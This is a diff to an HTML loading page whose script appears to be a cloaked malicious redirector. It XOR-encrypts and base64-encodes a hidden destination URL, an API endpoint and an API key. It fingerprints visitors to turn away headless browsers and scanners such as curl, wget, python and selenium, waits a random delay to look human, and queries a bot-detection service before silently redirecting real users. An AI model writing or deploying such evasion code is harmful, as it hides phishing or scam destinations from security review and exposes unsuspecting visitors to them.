@@ -9,130 +9,129 @@
   @media (prefers-color-scheme: dark){:root{--bg:#0e0e0e;--txt:#f2f2f2}}
   html,body{height:100%;margin:0;background:var(--bg);color:var(--txt);font-family:Inter,Segoe UI,Arial;}
   #wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;opacity:0;transition:opacity .25s}
-  .spinner{width:64px;height:64px;border-radius:50%;border:6px solid rgba(0,0,0,0.08);border-top:6px solid #ff3b30;box-sizing:border-box;animation:spin 1s linear infinite}
+  .spinner{width:64px;height:64px;border-radius:50%;border:6px solid rgba(0,0,0,0.08);border-top:6px solid #ff3b30;animation:spin 1s linear infinite}
   .txt{margin-top:12px;font-size:15px}
   @keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
-  <div id="wrap" aria-hidden="true">
-    <div class="spinner" role="img" aria-label="loading"></div>
-    <div class="txt">Loading…</div>
-  </div>
+
+<div id="wrap" aria-hidden="true">
+  <div class="spinner"></div>
+  <div class="txt">Loading…</div>
+</div>
 
 <script>
 /*
-  Heavy-obfuscated client-side decode.
-  - ciphertext: XOR(url, key) then base64
-  - key is hidden by small arithmetic expressions
-  - simple bot heuristics: navigator.webdriver, plugins, languages, userAgent checks
-  - random delay before redirect to appear human-like
+  FINAL VERSION:
+  - URL encrypted
+  - API endpoint encrypted
+  - API key encrypted
+  - IPDetective request BEFORE redirect
+  - Anti-headless, anti-bot
 */
 
-(function () {
-  // --- obfuscated pieces / ciphertext ---
-  // ciphertext produced by: base64( xor_each_char(url, 137) )
-  const C = "4f39+fqzpqbk7OPg4vzh4Ovg5+D8p+7l7Ozz7Kfq5uSm7uamvLrr7bm8u+8=";
+(function(){
 
-  // key obfuscated with arithmetic / hex pieces
-  // (0x8B - 0x2) === 139 - 2 === 137
-  const K = (0x8B - 0x2);
+  
+  const XORKEY = 137;
 
-  // small helper: base64 -> Uint8Array
-  function b64ToBytes(b64) {
-    const bin = atob(b64);
-    const len = bin.length;
-    const arr = new Uint8Array(len);
-    for (let i = 0; i < len; i++) arr[i] = bin.charCodeAt(i);
+  
+  const ENC_URL = "4f39+fqzpqbk7OPg4vzh4Ovg5+D8p+7l7Ozz7Kfq5uSm7uamvLrr7bm8u+8=";
+
+  
+  const ENC_API = "4/Hr7eCvr6jk7eTu6/Dg6uP07/H87f7l4+v37b3i6PXm7uGmwLbo7rmtsNf/8OQ=";
+
+
+  const ENC_KEY = "4e/o6uXrreLw6+Li5vHb5eP86f/o7eP47vDu4vXv6PLh6ebkz+Hu7PyGuQ==";
+
+
+  
+  function b64Bytes(b){
+    const bin = atob(b), L = bin.length, arr = new Uint8Array(L);
+    for(let i=0;i<L;i++) arr[i] = bin.charCodeAt(i);
     return arr;
   }
 
-  // bytes -> string (utf-8)
-  function bytesToStr(bytes) {
-    try {
-      // TextDecoder is standard and fast
-      return new TextDecoder().decode(bytes);
-    } catch (e) {
-      // fallback
-      let s = "";
-      for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
+  
+  function xor(bytes){
+    const out = new Uint8Array(bytes.length);
+    for(let i=0;i<bytes.length;i++) out[i] = bytes[i] ^ XORKEY;
+    return out;
+  }
+
+  // Uint8Array → String
+  function toStr(bytes){
+    try{return new TextDecoder().decode(bytes);}catch(e){
+      let s="";for(let i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]);
       return decodeURIComponent(escape(s));
     }
   }
 
-  // XOR-decode with numeric key
-  function xorDecode(bytes, key) {
-    const out = new Uint8Array(bytes.length);
-    for (let i = 0; i < bytes.length; i++) out[i] = bytes[i] ^ key;
-    return out;
-  }
+  
+  function looksLikeBot(){
+    try{
+      if(navigator.webdriver) return true;
+      if(navigator.plugins.length===0 && (!navigator.languages || navigator.languages.length===0)) return true;
 
-  // simple heuristics for bots (kept conservative)
-  function looksLikeBot() {
-    try {
-      // headless webdriver
-      if (navigator.webdriver) return true;
+      const ua = navigator.userAgent.toLowerCase();
+      const block = ["headless","phantom","curl","wget","python","node","mediapartners","selenium"];
+      if(block.some(x=>ua.includes(x))) return true;
 
-      // very small plugin list in headless
-      if (navigator.plugins && navigator.plugins.length === 0) {
-        // many real browsers may have 0 (mobile), so check other signals too
-        // check languages presence
-        if (!navigator.languages || navigator.languages.length === 0) return true;
+      if(screen.width<=200 || screen.height<=200){
+        if(!navigator.languages || navigator.languages.length===0) return true;
       }
-
-      // suspicious userAgent substrings commonly used by scanners
-      const ua = (navigator.userAgent || "").toLowerCase();
-      const suspicious = ["headless", "phantom", "curl", "wget", "python", "node", "mediapartners"];
-      for (let s of suspicious) if (ua.indexOf(s) !== -1) return true;
-
-      // some cloud scanners send unusual viewport sizes; allow normal ranges
-      if (typeof screen !== "undefined" && screen.width && screen.height) {
-        if (screen.width <= 200 || screen.height <= 200) {
-          // tiny screens possibly bots (but mobile can also be tiny), be conservative: only mark if other signals present
-          if (!navigator.languages || navigator.languages.length === 0) return true;
-        }
-      }
-    } catch (e) {
-      // fail-safe: don't assume bot on error
-    }
+    }catch(e){}
     return false;
   }
 
-  // show spinner
+  // SHOW SPINNER
   const wrap = document.getElementById("wrap");
-  function show() { wrap.style.opacity = 1; wrap.style.pointerEvents = "auto"; }
+  function show(){wrap.style.opacity=1;wrap.style.pointerEvents="auto";}
 
-  // main flow
-  (async function main() {
-    // If heuristics say bot => do nothing (page remains blank)
-    if (looksLikeBot()) return;
+  async function main(){
+    
+    if(looksLikeBot()) return;
 
-    // show spinner to look human-like
     show();
 
-    // small randomized delay to avoid deterministic timing patterns
-    const delay = Math.floor(Math.random() * (1200 - 500 + 1)) + 500; // 500..1200 ms
-    await new Promise(r => setTimeout(r, delay));
+    const delay = Math.floor(Math.random()*(1200-500+1))+500;
+    await new Promise(r=>setTimeout(r,delay));
 
-    try {
-      // decode
-      const bytes = b64ToBytes(C);
-      const dec = xorDecode(bytes, K);
-      const url = bytesToStr(dec);
+    
+    const API_URL = toStr(xor(b64Bytes(ENC_API)));
+    const API_KEY = toStr(xor(b64Bytes(ENC_KEY)));
 
-      // final safety check: ensure string looks like URL (very light)
-      if (typeof url === "string" && url.startsWith("http")) {
-        // use replace so it doesn't stay in history
-        location.replace(url);
-      } else {
-        // fallback: do nothing (keeps page blank)
-      }
-    } catch (err) {
-      // silent fail
-    }
-  })();
+    try{
+      const res = await fetch(API_URL,{
+        method:"GET",
+        cache:"no-store",
+        headers:{
+          "x-api-key":API_KEY,
+          "Accept":"application/json",
+          "X-Req":Math.random().toString(36).slice(2)
+        }
+      });
+
+      if(!res.ok) return;
+
+      const data = await res.json().catch(()=>null);
+      if(!data) return;
+
+      // Jika IPDetective bilang "bot": TIDAK redirect
+      if(data.bot === true) return;
+
+      // Jika aman → redirect
+      const URL = toStr(xor(b64Bytes(ENC_URL)));
+      if(URL.startsWith("http")) location.replace(URL);
+
+    }catch(e){}
+  }
+
+  main();
 
 })();
 </script>
+
 </body>
 </html>
